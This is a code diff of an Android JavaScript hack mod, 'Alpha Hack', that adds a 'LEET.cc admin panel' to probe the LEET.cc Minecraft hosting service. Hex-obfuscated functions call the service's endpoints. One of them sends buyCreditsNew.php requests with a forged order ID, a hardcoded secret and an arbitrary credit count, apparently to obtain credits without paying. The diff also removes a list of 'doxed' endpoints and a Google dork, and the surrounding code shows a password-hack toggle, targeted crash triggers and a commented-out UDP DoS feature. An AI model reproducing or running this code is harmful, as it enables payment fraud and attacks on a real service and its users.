+            var hmenuLayout1 = new android.widget.LinearLayout(ctx);
+            hmenuLayout.setOrientation(1);
+            hmenuLayout1.setOrientation(1);
+
+            hmenuScroll.addView(hmenuLayout);
+            hmenuLayout1.addView(hmenuScroll);
+
+var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
+		MainTitle.setText("Alphα Hαck" + space + version);
+       MainTitle.setTextColor(GUIName);
+		MainTitle.setTextSize(20);
+		hmenuLayout.addView(MainTitle);
+
+var htitle = new android.widget.TextView(ctx); htitle.setGravity(android.view.Gravity.CENTER);
+		htitle.setText("LEET.cc admin panel");
+       htitle.setTextColor(GUIName);
+		htitle.setTextSize(20);
+		hmenuLayout.addView(htitle);
+
+var hmenuLay = new android.widget.LinearLayout(ctx);
+	 hmenuLay.setOrientation(0);
+
+var xty = new android.widget.Button(ctx);
+            xty.setText("Get support ID");
+            xty.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+//hmenu.dismiss();
+
+idsss();
+
+                }
+            }));
+            hmenuLay.addView(xty);
+
+var leet = new android.widget.Button(ctx);
+            leet.setText("Info of server");
+            leet.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+//hmenu.dismiss();
+ids();
+                }
+            }));
+            hmenuLay.addView(leet);
+
+var leet5 = new android.widget.Button(ctx);
+            leet5.setText("Donations");
+            leet5.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+//hmenu.dismiss();
+don();
+                }
+            }));
+            hmenuLay.addView(leet5);
+
+var sh = new android.widget.Button(ctx);
+            sh.setText("User donations");
+            sh.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+//hmenu.dismiss();
+somenow(); 
                 }
             }));
-            cmenuLayout.addView(s);*/
+            hmenuLay.addView(sh);
+
+hmenuLayout.addView(hmenuLay);
+
+var hmenuL = new android.widget.LinearLayout(ctx);
+	 hmenuL.setOrientation(0);
+
+var s2 = new android.widget.Button(ctx);
+            s2.setText("Featured servers");
+            s2.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+//hmenu.dismiss();
+pe2(); 
+                }
+            }));
+            hmenuL.addView(s2);
+
+hmenuLayout.addView(hmenuL);
+		
+			var hmenu3 = new android.widget.LinearLayout(ctx);
+	 hmenu3.setOrientation(0);
+	
+	var a11 = new android.widget.Button(ctx);
+            a11.setText("ID of email");
+            a11.setOnClickListener(new android.view.View.OnClickListener({
+                onClick: function(viewarg){
+//hmenu.dismiss();
+//ReId();
+print("Not added");
+                }
+            }));
+            hmenu3.addView(a11);
+	
+	hmenuLayout.addView(hmenu3);
+
+var h_exit = new android.widget.Button(ctx);
+		h_exit.setText("Exit panel");
+	   h_exit.setOnClickListener(new android.view.View.OnClickListener() {
+			onClick: function(v){
+             hmenu.dismiss();
+showMenuBtn();
+			}
+		});
+		hmenuLayout.addView(h_exit);
+
+            hmenu = new android.widget.PopupWindow(hmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/1, ctx.getWindowManager().getDefaultDisplay().getHeight());
+
+hmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+            hmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
+        }catch(error){
+            print("A Error Has Happen: " + error);
+        }
+    }}));
+}
+
+var _0x5b66=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x66\x65\x61\x74\x75\x72\x65\x64\x53\x65\x72\x76\x65\x72\x73\x2E\x70\x68\x70","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pe2(){ctx[_0x5b66[12]]( new java[_0x5b66[11]].Runnable({run:function(){var _0xa378x2= new android[_0x5b66[0]].WebView(ctx);var _0xa378x3=_0xa378x2[_0x5b66[1]]();_0xa378x3[_0x5b66[2]](true);_0xa378x2[_0x5b66[3]]( new android[_0x5b66[0]].WebChromeClient());_0xa378x2[_0x5b66[4]]( new android[_0x5b66[0]].WebViewClient());_0xa378x2[_0x5b66[6]](_0x5b66[5]); new android[_0x5b66[10]][_0x5b66[9]].Builder(ctx)[_0x5b66[8]](_0xa378x2)[_0x5b66[7]]()}}))}
+
+var _0xaa73=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x6A\x73","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pe3(){ctx[_0xaa73[12]]( new java[_0xaa73[11]].Runnable({run:function(){var _0xa81fx2= new android[_0xaa73[0]].WebView(ctx);var _0xa81fx3=_0xa81fx2[_0xaa73[1]]();_0xa81fx3[_0xaa73[2]](true);_0xa81fx2[_0xaa73[3]]( new android[_0xaa73[0]].WebChromeClient());_0xa81fx2[_0xaa73[4]]( new android[_0xaa73[0]].WebViewClient());_0xa81fx2[_0xaa73[6]](_0xaa73[5]); new android[_0xaa73[10]][_0xaa73[9]].Builder(ctx)[_0xaa73[8]](_0xa81fx2)[_0xaa73[7]]()}}))}
+
+var _0xe298=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x66\x6F\x72\x75\x6D\x2E\x6C\x65\x65\x74\x2E\x63\x63\x2F\x73\x69\x74\x65\x6D\x61\x70\x2E\x78\x6D\x6C","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pe4(){ctx[_0xe298[12]]( new java[_0xe298[11]].Runnable({run:function(){var _0x21a4x2= new android[_0xe298[0]].WebView(ctx);var _0x21a4x3=_0x21a4x2[_0xe298[1]]();_0x21a4x3[_0xe298[2]](true);_0x21a4x2[_0xe298[3]]( new android[_0xe298[0]].WebChromeClient());_0x21a4x2[_0xe298[4]]( new android[_0xe298[0]].WebViewClient());_0x21a4x2[_0xe298[6]](_0xe298[5]); new android[_0xe298[10]][_0xe298[9]].Builder(ctx)[_0xe298[8]](_0x21a4x2)[_0xe298[7]]()}}))}
+
+
+var _0xc25f=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x6D\x63\x70\x63\x2F\x6D\x61\x70\x73\x2F","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pe5(){ctx[_0xc25f[12]]( new java[_0xc25f[11]].Runnable({run:function(){var _0x2bd7x2= new android[_0xc25f[0]].WebView(ctx);var _0x2bd7x3=_0x2bd7x2[_0xc25f[1]]();_0x2bd7x3[_0xc25f[2]](true);_0x2bd7x2[_0xc25f[3]]( new android[_0xc25f[0]].WebChromeClient());_0x2bd7x2[_0xc25f[4]]( new android[_0xc25f[0]].WebViewClient());_0x2bd7x2[_0xc25f[6]](_0xc25f[5]); new android[_0xc25f[10]][_0xc25f[9]].Builder(ctx)[_0xc25f[8]](_0x2bd7x2)[_0xc25f[7]]()}}))}
+
+
+
 
 function somethingomgyay() {
 ctx.runOnUiThread(new java.lang.Runnable(){
@@ -1113,48 +1561,6 @@ hackpass.setText("Hack password: "+(hackk?"on":"off"));
             }));
             cmenuLayout.addView(hackpass);
 
-var cl = new android.widget.Button(ctx);
-		cl.setText("LEET.cc sites");
-		cl.setOnClickListener(new android.view.View.OnClickListener() {
-			onClick: function(v){
-var alert = new android.app.AlertDialog.Builder(ctx); 
-alert.setTitle("Alphα Hαck found sites"); 
-
-var scroll = new android.widget.ScrollView(ctx); 
-var layout = new android.widget.LinearLayout(ctx); 
-layout.setOrientation(1);
-
-alert.setTitle("AlphaHack found sites");
- alert.setMessage("These are LEET.cc doxed sites connecting to leet, i found by doxing, searching in index, in files, in sites etc... use at your own risk if you know how to use.\nhttps://leet.cc/serverNew.php\nhttps://leet.cc\nhttps://leet.cc/#plugins\nhttps://leet.cc/pluginLoaderAPI.php\nhttps://leet.cc/featuredServers.php\nhttps://leet.cc/paypalPayment.php\nhttps://leet.cc/verifyServerDomain.php\nhttps://leet.cc/verifyServer.php\nhttps://leet.cc/verifyUser.php\nhttps://leet.cc/news\nhttps://leet.cc/robots.txt\nhttps://leet.cc/media\nhttps://leet.cc/styles\nhttps://leet.cc/js\nhttps://leet.cc/login.php\nhttps://leet.cc/buyCreditsNew.php\nhttps://forum.leet.cc\nhttps://hosting.leet.cc\nhttps://hosting2.leet.cc\nhttps://leethost.io\nhttps://mcpe.leet.cc\nhttps://mcpc.leet.cc\nhttps://leet.cc/uploadImage.php\nhttp://srgblock4051.leet.cc\nhttp://leet.cc/mcpc/maps\nhttp://forum.leet.cc/sitemap.xml\nhttps://leet.cc/actionNew.php\nhttps://www.google.com/search?q=site:leet.cc+ext:doc+%7C+ext:docx+%7C+ext:odt+%7C+ext:pdf+%7C+ext:rtf+%7C+ext:sxw+%7C+ext:psw+%7C+ext:ppt+%7C+ext:pptx+%7C+ext:pps+%7C+ext:csv");
-
-alert.setPositiveButton("Exit all", new android.content.DialogInterface.OnClickListener(){ 
-  onClick: function(viewarg){
-    
-dialog.dismiss();
-cmenu.dismiss();
-      }});
-
-alert.setNegativeButton("Back to menu", new android.content.DialogInterface.OnClickListener(){ 
-   onClick: function(viewarg){
-
-dialog.dismiss();
-      }});
-var dialog = alert.create();
-dialog.show();
-			}
-		});
-		cmenuLayout.addView(cl);
-
-var leet3 = new android.widget.Button(ctx);
-            leet3.setText("LEET.cc Get ID");
-            leet3.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-cmenu.dismiss();
-idsss();
-                }
-            }));
-            cmenuLayout.addView(leet3);
-
 function idsss() {
 ctx.runOnUiThread(new java.lang.Runnable(){
 run: function(){ 
@@ -1182,11 +1588,9 @@ onClick: function(view){
 ip =ID4.getText();
 if(ip=="c57788.leet.cc")crash();
 if(ID4=="c57788.leet.cc")crash();
-if(ip=="b40703.leet.cc")crash();
-if(ID4=="b40703.leet.cc")crash();
 Dialog.dismiss();
 pee3();
-print("Loading webpage");
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
 showMenuBtn();
 }
 });
@@ -1202,15 +1606,7 @@ print("The LEET Dialog Is Malfunctioning:"+e);
 
 var _0xc281=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x76\x65\x72\x69\x66\x79\x53\x65\x72\x76\x65\x72\x44\x6F\x6D\x61\x69\x6E\x2E\x70\x68\x70\x3F\x76\x65\x72\x73\x69\x6F\x6E\x43\x6F\x64\x65\x3D\x31\x34\x26\x64\x6F\x6D\x61\x69\x6E\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pee3(){ctx[_0xc281[12]]( new java[_0xc281[11]].Runnable({run:function(){var _0x1ac1x2= new android[_0xc281[0]].WebView(ctx);var _0x1ac1x3=_0x1ac1x2[_0xc281[1]]();_0x1ac1x3[_0xc281[2]](true);_0x1ac1x2[_0xc281[3]]( new android[_0xc281[0]].WebChromeClient());_0x1ac1x2[_0xc281[4]]( new android[_0xc281[0]].WebViewClient());_0x1ac1x2[_0xc281[6]](_0xc281[5]+ip); new android[_0xc281[10]][_0xc281[9]].Builder(ctx)[_0xc281[8]](_0x1ac1x2)[_0xc281[7]]()}}))}
 
-var leet5 = new android.widget.Button(ctx);
-            leet5.setText("LEET.cc donate List");
-            leet5.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-cmenu.dismiss();
-don();
-                }
-            }));
-            cmenuLayout.addView(leet5);
+
 
 function don() {
 ctx.runOnUiThread(new java.lang.Runnable(){
@@ -1232,6 +1628,7 @@ Layer3.addView(Exit);
 
 IDm.setText("");
 IDm.setHint("Support ID");
+IDm.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
 Exit.setText("view list");
 
 Exit.setOnClickListener(new android.view.View.OnClickListener(){
@@ -1239,7 +1636,7 @@ onClick: function(view){
 gd =IDm.getText();
 Dialog.dismiss();
 donList();
-print("Loading web page");
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
 showMenuBtn();
 }
 });
@@ -1255,15 +1652,7 @@ print("The LEET Dialog Is Malfunctioning:"+e);
 
 var _0x28f6=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x67\x65\x74\x44\x6F\x6E\x61\x74\x69\x6F\x6E\x73\x2E\x70\x68\x70\x3F\x73\x65\x72\x76\x65\x72\x49\x44\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function donList(){ctx[_0x28f6[12]]( new java[_0x28f6[11]].Runnable({run:function(){var _0xc511x2= new android[_0x28f6[0]].WebView(ctx);var _0xc511x3=_0xc511x2[_0x28f6[1]]();_0xc511x3[_0x28f6[2]](true);_0xc511x2[_0x28f6[3]]( new android[_0x28f6[0]].WebChromeClient());_0xc511x2[_0x28f6[4]]( new android[_0x28f6[0]].WebViewClient());_0xc511x2[_0x28f6[6]](_0x28f6[5]+gd); new android[_0x28f6[10]][_0x28f6[9]].Builder(ctx)[_0x28f6[8]](_0xc511x2)[_0x28f6[7]]()}}))}
 
-var leet2 = new android.widget.Button(ctx);
-            leet2.setText("LEET.cc Donate");
-            leet2.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-cmenu.dismiss();
-idss();
-                }
-            }));
-            cmenuLayout.addView(leet2);
+
 
 function idss() {
 ctx.runOnUiThread(new java.lang.Runnable(){
@@ -1318,15 +1707,7 @@ print("The LEET Dialog Is Malfunctioning:"+e);
 
 var _0x6b2c=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x62\x75\x79\x43\x72\x65\x64\x69\x74\x73\x4E\x65\x77\x2E\x70\x68\x70\x3F\x75\x73\x65\x72\x49\x44\x3D","\x26\x73\x65\x72\x76\x65\x72\x49\x44\x3D","\x26\x63\x72\x65\x64\x69\x74\x73\x3D","\x26\x6F\x72\x64\x65\x72\x49\x44\x3D\x47\x50\x41\x2E\x38\x32\x34\x34\x2D\x35\x36\x37\x38\x2D\x39\x30\x34\x32\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x26\x76\x65\x72\x73\x69\x6F\x6E\x43\x6F\x64\x65\x3D\x31\x34\x26\x70\x61\x73\x73\x77\x6F\x72\x64\x3D\x73\x6F\x6D\x65\x74\x68\x69\x6E\x67\x5F\x73\x65\x63\x72\x65\x74\x26\x63\x6C\x69\x65\x6E\x74\x3D\x67\x6F\x6F\x67\x6C\x65\x2D\x64\x6F\x6E\x61\x74\x69\x6F\x6E","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pee2(){ctx[_0x6b2c[18]]( new java[_0x6b2c[17]].Runnable({run:function(){var _0x2fbex2= new android[_0x6b2c[0]].WebView(ctx);var _0x2fbex3=_0x2fbex2[_0x6b2c[1]]();_0x2fbex3[_0x6b2c[2]](true);_0x2fbex2[_0x6b2c[3]]( new android[_0x6b2c[0]].WebChromeClient());_0x2fbex2[_0x6b2c[4]]( new android[_0x6b2c[0]].WebViewClient());_0x2fbex2[_0x6b2c[12]](_0x6b2c[5]+usr+_0x6b2c[6]+id+_0x6b2c[7]+credit+_0x6b2c[8]+(Math[_0x6b2c[10]](Math[_0x6b2c[9]]()*(99999-10000+1))+10000)+_0x6b2c[11]); new android[_0x6b2c[16]][_0x6b2c[15]].Builder(ctx)[_0x6b2c[14]](_0x2fbex2)[_0x6b2c[13]]()}}))}
 
-var leet = new android.widget.Button(ctx);
-            leet.setText("LEET.cc Info");
-            leet.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-cmenu.dismiss();
-ids();
-                }
-            }));
-            cmenuLayout.addView(leet);
+
 
 function ids() {
 ctx.runOnUiThread(new java.lang.Runnable(){
@@ -1355,7 +1736,7 @@ onClick: function(view){
 end =ID.getText();
 Dialog.dismiss();
 pee();
-print("Loading web page");
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
 showMenuBtn();
 }
 });
@@ -1371,15 +1752,7 @@ print("The LEET Dialog Is Malfunctioning:"+e);
 
       var _0x9c2d=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x73\x65\x72\x76\x65\x72\x4E\x65\x77\x2E\x70\x68\x70\x3F\x73\x65\x72\x76\x65\x72\x49\x44\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function pee(){ctx[_0x9c2d[12]]( new java[_0x9c2d[11]].Runnable({run:function(){var _0x369dx2= new android[_0x9c2d[0]].WebView(ctx);var _0x369dx3=_0x369dx2[_0x9c2d[1]]();_0x369dx3[_0x9c2d[2]](true);_0x369dx2[_0x9c2d[3]]( new android[_0x9c2d[0]].WebChromeClient());_0x369dx2[_0x9c2d[4]]( new android[_0x9c2d[0]].WebViewClient());_0x369dx2[_0x9c2d[6]](_0x9c2d[5]+end); new android[_0x9c2d[10]][_0x9c2d[9]].Builder(ctx)[_0x9c2d[8]](_0x369dx2)[_0x9c2d[7]]()}}))}
 
-/*var leet4 = new android.widget.Button(ctx);
-            leet4.setText("LEET.cc app news");
-            leet4.setOnClickListener(new android.view.View.OnClickListener({
-                onClick: function(viewarg){
-cmenu.dismiss();
-getNews();
-                }
-            }));
-            cmenuLayout.addView(leet4);*/
+
 
 function getNews() {
 ctx.runOnUiThread(new java.lang.Runnable(){
@@ -1408,7 +1781,7 @@ onClick: function(view){
 nw =IDD.getText();
 Dialog.dismiss();
 pe();
-print("Loading web page");
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
 showMenuBtn();
 }
 });
@@ -1435,6 +1808,94 @@ function pe()
       new android.app.AlertDialog.Builder(ctx).setView(webs).show();
       }}));
       }
+
+
+
+function somenow() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+getNews = new android.widget.PopupWindow();
+var Layer3 = new android.widget.LinearLayout(ctx);
+var IDu = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter to username");
+Dialog.setContentView(Layer3);
+
+Layer3.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer3.addView(IDu);
+Layer3.addView(Exit);
+
+IDu.setText("");
+IDu.setHint("Username");
+Exit.setText("get donations");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+userr =IDu.getText();
+Dialog.dismiss();
+okey();
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
+showMenuBtn();
+}
+});
+
+getNews.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+getNews.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+getNews.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The LEET Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+var _0x595f=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x67\x65\x74\x44\x6F\x6E\x61\x74\x69\x6F\x6E\x73\x2E\x70\x68\x70\x3F\x76\x65\x72\x73\x69\x6F\x6E\x43\x6F\x64\x65\x3D\x31\x34\x26\x75\x73\x65\x72\x6E\x61\x6D\x65\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function okey(){ctx[_0x595f[12]]( new java[_0x595f[11]].Runnable({run:function(){var _0xbbc7x2= new android[_0x595f[0]].WebView(ctx);var _0xbbc7x3=_0xbbc7x2[_0x595f[1]]();_0xbbc7x3[_0x595f[2]](true);_0xbbc7x2[_0x595f[3]]( new android[_0x595f[0]].WebChromeClient());_0xbbc7x2[_0x595f[4]]( new android[_0x595f[0]].WebViewClient());_0xbbc7x2[_0x595f[6]](_0x595f[5]+userr); new android[_0x595f[10]][_0x595f[9]].Builder(ctx)[_0x595f[8]](_0xbbc7x2)[_0x595f[7]]()}}))}
+
+function getava() {
+ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){ 
+try{
+getNews = new android.widget.PopupWindow();
+var Layer3 = new android.widget.LinearLayout(ctx);
+var IDuu = new android.widget.EditText(ctx);
+var Dialog = new android.app.Dialog(ctx);
+var Exit = new android.widget.Button(ctx);
+
+Dialog.setTitle("Enter to username");
+Dialog.setContentView(Layer3);
+
+Layer3.setOrientation(android.widget.LinearLayout.VERTICAL);
+Dialog.show();
+Layer3.addView(IDuu);
+Layer3.addView(Exit);
+
+IDuu.setText("");
+IDuu.setHint("Username");
+Exit.setText("get availability");
+
+Exit.setOnClickListener(new android.view.View.OnClickListener(){
+onClick: function(view){
+userrr =IDuu.getText();
+Dialog.dismiss();
+okeyy();
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
+showMenuBtn();
+}
+});
+
+getNews.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+getNews.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+getNews.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
+} catch (e){
+print("The LEET Dialog Is Malfunctioning:"+e);
+}
+}});
+}
+
+var _0xb048=["\x77\x65\x62\x6B\x69\x74","\x67\x65\x74\x53\x65\x74\x74\x69\x6E\x67\x73","\x73\x65\x74\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x73\x65\x74\x57\x65\x62\x43\x68\x72\x6F\x6D\x65\x43\x6C\x69\x65\x6E\x74","\x73\x65\x74\x57\x65\x62\x56\x69\x65\x77\x43\x6C\x69\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x6C\x65\x65\x74\x2E\x63\x63\x2F\x76\x65\x72\x69\x66\x79\x55\x73\x65\x72\x2E\x70\x68\x70\x3F\x76\x65\x72\x73\x69\x6F\x6E\x43\x6F\x64\x65\x3D\x31\x34\x26\x75\x73\x65\x72\x6E\x61\x6D\x65\x3D","\x6C\x6F\x61\x64\x55\x72\x6C","\x73\x68\x6F\x77","\x73\x65\x74\x56\x69\x65\x77","\x41\x6C\x65\x72\x74\x44\x69\x61\x6C\x6F\x67","\x61\x70\x70","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64"];function okeyy(){ctx[_0xb048[12]]( new java[_0xb048[11]].Runnable({run:function(){var _0x802cx2= new android[_0xb048[0]].WebView(ctx);var _0x802cx3=_0x802cx2[_0xb048[1]]();_0x802cx3[_0xb048[2]](true);_0x802cx2[_0xb048[3]]( new android[_0xb048[0]].WebChromeClient());_0x802cx2[_0xb048[4]]( new android[_0xb048[0]].WebViewClient());_0x802cx2[_0xb048[6]](_0xb048[5]+userrr); new android[_0xb048[10]][_0xb048[9]].Builder(ctx)[_0xb048[8]](_0x802cx2)[_0xb048[7]]()}}))}
 
 /*var dd1 = new android.widget.Button(ctx);
            dd1.setText("DoS UDP");
@@ -1499,8 +1960,6 @@ print("The DoS UDP Dialog Is Malfunctioning:"+e);
 }});
 }
 
